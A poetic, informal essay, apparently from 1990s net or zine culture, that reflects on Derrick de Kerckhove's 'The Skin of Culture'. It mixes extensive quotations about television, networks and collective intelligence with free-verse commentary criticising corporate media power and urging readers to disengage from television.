IBM's getting bigger, but hey aren't we all.
As if growth hasn't been the motivational force behind the
industrial economy.
And you know it was developments in media that enabled it all.
Communication is the cornerstone of any civilization.

Now if you can find a large piece of grass in your respective
urban deserts,
bend down and put your ear to the ground;
you hear what i hear?
ground's changing jack
right beneath your feet
listen closely; can you hear the pulse
the ground's going and it's taking you with it

Here comes part two of the study of Derrick DeKerckhove's new
book The Skin Of Culture.
Brother Jay gets hold of the copy next, and you know the man's
gonna lay it down; like many others he's been feeling the
change. DeKerckhove calls it skin of culture, 'cause its
something to feel. McLuhan said that shit about "in the
electronic age we wear all mankind as our skin," we are all the
leviathan, and we all feel what the leviathan feels. Perhaps
we're still disoriented a bit, 'cause relatively speaking we
still young. But what happens when the child matures?

"Nets, internets and ethernets are growing in rapid spurts like
the brain of an infant leviathan." (DeKerckhove pp. 54)

Feel the power of youth, the power of creation, the power of an
uncertain and potentially volatile future.

"The Net is a monumental computer all by itself, with astounding
organic memory banks and parallel processors today numbering
over twenty million, tomorrow a billion coprocessors. Why would
anyone want to call that a highway? The internet is really a 
brain, a collective, living brain clicking as you read. It is a
brain that never ceases to work, to think, to produce
information, to sort and to combine." (DeKerckhove pp. 55)

Damn does this baby have intelligence
It knows before it happens
And if it knows before it happens, then it can make it happen.
What happens to time when it becomes virtual?

"Neural networks represent a radically new departure in computer
technology. It is a new generation of computer intelligence
bringing us ever closer to emulating the human brain."
(DeKerckhove pp. 142)

First you extend yourself perhaps only a little,
But then the experience is so pleasing you extend more
And you can't get enough,
So you keep extending.
Of course you didn't think about yin and yang, and equilibrium
And the interactive nature of communication
'Cause when you give you get, extend and be extended unto
Create the wholly electronic bond.

"'Unlike most computers, a neural network learns from its
mistakes'" (DeKerckhove pp. 144)

Don't look back jack
Maybe you've extended too far, and what you had ain't no more
Of course it's fixed now, better than ever, got your new upgrade
Feels the same as normal; but what's normal?

"And it comes from below, from the underground, the subconscious
level of our collective intelligence. Just like the subconscious
level, it is made of way too much data for all of it to be
filtered at the conscious level. this is why larger units of
processing and distributing are necessary." (DeKerckhove pp. 55)

Driven to succeed, gotta be the best
Can't let your leg go obsolete; get the upgrade jack
Do your part in the construction of the new world's wonder

"The fact that we are indeed embarking on a course of total
control over nature is abundantly demonstrated by our recent
predilection for the vocabulary of artificial reality. Words
such as "virtual" reality, "cyber" space, "real" time,
"artificial" life, and "endo-" and "nanotechnologies," are
enjoying a vertical growth curve. They are clear linguistic
symptoms of a "cyborg" trend that seeks to blend organic and
technical realms." (DeKerckhove pp. 83)

Plug them into your neurodes and harness the power
Be one with the global entity,
Submerse into the global conscious
Lose yourself in the total perspective vortex

"The new electronic media are becoming intermediate
environments, accessing the intimate reality of our private
psyches and providing a bridge to the outside world. They effect
a kind of social mediation in a single continuous extension of
our personal powers of imagination, concentration and action.
They function largely like a second mind one soon to be endowed
with more autonomy than we might care for." (DeKerckhove pp. 209)

Ooops, you did it again jack
Extended yourself too far
Now your stuck again, lost that sovereignty thing
Gave your real freedom for some of that 19.99 virtual freedom.
Designer drugs and technology replace a smoke and mirrors
illusion of democracy.

"The mass media serve as a system for communicating messages and
symbols to the general populace. It is their function to amuse,
entertain, and inform, and to inculcate individuals with the
values, beliefs, and codes of behaviour that will integrate them
into the institutional structures of the larger society. In a
world of concentrated wealth and major conflicts of class
interest, to fulfil this role requires systematic propaganda."
(Chomsky, Manufacturing Consent pp. 1)

Now some of these motherfuckers, when they get access to new
media, they don't fool around. The tap the elements of power and
control inherent in all media, and exploit them in the means of
creating empire. Propaganda and straight out programming have
been the dominant characteristics power has taken in relation to
media.

"TV must zap the zapper before he or she zaps the channel."
(DeKerckhove pp. 11)

Television, perhaps the most successful mass indoctrination
tool, penetrates and violates the populace, physically altering
the sub-conscious and therefore conscious of its victims. And
you best believe we all the victims; we're all niggaz to the man.

"Television evokes Orienting Responses that are woven into the
fabric of our neuromuscular system." (DeKerckhove pp. 12)

The nerves are embedded within our skull; electrons rammed into
our minds, leaving fingerprints so deep that most become instant
addicts and dependents.

"When we read, we scan the books, we are in control. But when we
watch tv, it is the tv scanner that 'reads' us. Our retinas are
the direct object of the electron beam. When scanning meets
glancing and makes eye contact between eye and machine, the
machine's glance is the more powerful. In front of the
television set, our defences are down; we are vulnerable and
susceptible to multi-sensory seduction." (DeKerckhove pp. 14)

Seduction by power, global power
That draws us closer, until we within the range of electronic
gravity
The force that binds and holds for millennia

"The simple explanation that tv talks to the body rather than
the mind says much more about television overriding our critical
faculties." (DeKerckhove pp. 15)

Television homogenizes reality, and computers create it.

"Television and computers conquered the industrialized world,
carving and shaping the corporate psychology according to their
own highly distinctive criteria which, in turn, formed and
informed distinctive policies within the culture that helped to
develop others." (DeKerckhove pp. 130)

Corporate culture reigns. The heroes of cultural movements past
and present are bought off. The easiest way to deter threats is
to absorb them. The reasoning behind universal suffrage was to
eliminate the boat rockers by putting the rebels in the boat.
It's time to learn how to swim jack.

"we are all more or less programmable, if not genetic mutants."
(DeKerckhove pp. 175)

Nature became human when the man learned to read, but then the
man took nature and sold it to balance the books. Little did man
realize that the human was nature and when he sold nature he
sold himself. We all got duped, sold in the great slave trade of
civilization, so now the books balance all of us. We
relinquished our responsibilities to responsible government,
then the government relinquished its responsibility to free
trade and the will of the market.

"Television provides all of us with a psychotechnological moral
envelope. By selecting the topics of our moral consciousness, it
also does some of our thinking for us. Armies of reporters and
advertisers help to sort out what's worth saying and what isn't.
We are interwoven into a mass psychology that selects our issues
for us and unifies us in convergent opinions. TV doesn't take
chances with public morality. When a controversial issue comes
up, such as whether to question or even defy a government
decision, North American and European TV stations appear to be
endowed with a sort of automatic system of standardization and
self-censorship. The news on one channel is often identical,
item for item, to what's being reported on another."
(DeKerckhove pp. 207)

We are lost in an urban wilderness of conformity and irrelevant
choice. We feel the change, but do we have full consciousness?

"reality is technology-dependent, it changes every time new
technologies invade it. A worldview based on print is challenged
and weakened by the appearance of television, just as a
worldview based on broadcast television is deeply threatened by
computer networks." (DeKerckhove pp. 169)

We're perhaps just beginning to get a grasp on what happened
back then; but what about know, why is the present and future
reality so elusive.

"inconspicousness - things want to hide, to meld into the
background." (DeKerckhove pp. 96)

We know we're dealing with a movement in the ground; a movement
so dramatic and transformative, that perhaps it slips by
unnoticed. We've caught the commercials, but they're always in
rhymes and riddles.

"The trend to discretion may, in some cases, come from a sort of
self-regulated strategy. Electricity is going undercover, so to
speak, not only because it partakes of the nature of the human
nervous system, but also because a baseline technology works
best when it remains unquestioned and undetected." (DeKerckhove
pp. 98)

This trend of inconspicousness will only increase. The
institution will only continue to dissolve into all nooks and
neurodes of our society. Integration and convergence will only
increase as time gallops forward.

"We need more, not fewer global metaphors to begin to recognize
our planet not only as our home, but as our very body."
(DeKerckhove pp. 173)

Implosion hurtling us together into a cataclysmic future of
single identity.

"A new human is in the making." (DeKerckhove pp. 217)

A human constructed on exploitation and domination. Best believe
you better get your shit together jack, and i and i do mean
quick!

" If information is truly the staple of today's economy, it
might be useful to keep in mind that information is the only
substance that actually grows with use, rather than depleting
like our natural resources. We are looking at an economy of
abundance. This economy will only occur when the infrastructure
allows universal access. Universal access itself willl come by
nature or by force, the sooner, the better. However, it may take
a political and social revolution. Just as the old monarchic
power structures had to be toppled over and 'beheaded' to make
room for the body of the people in the democratic process, the
present establishment of communications and information control
may have to be zapped out of existence. The transition has begun
quite peacefully thanks to the increased sophistcation of
domestic production technologies and the increased need for
production." (DeKerckhove pp. 58)

turn off the boob-tube; it ain't doin' ya any good
exert your influence and identity in the electronic environment
be sure to participate in the fight for your life
as the global 'you' begins to rise, get off your ass and mobilize
we gotta go on the lam, so watch out for the man
he will be after your ass, there's no hiding in the mass
all you've got is your love
and the love of the people
i and i slipping out of babylon
let it go down in the flames of change
stand up for your rights
free your brain...
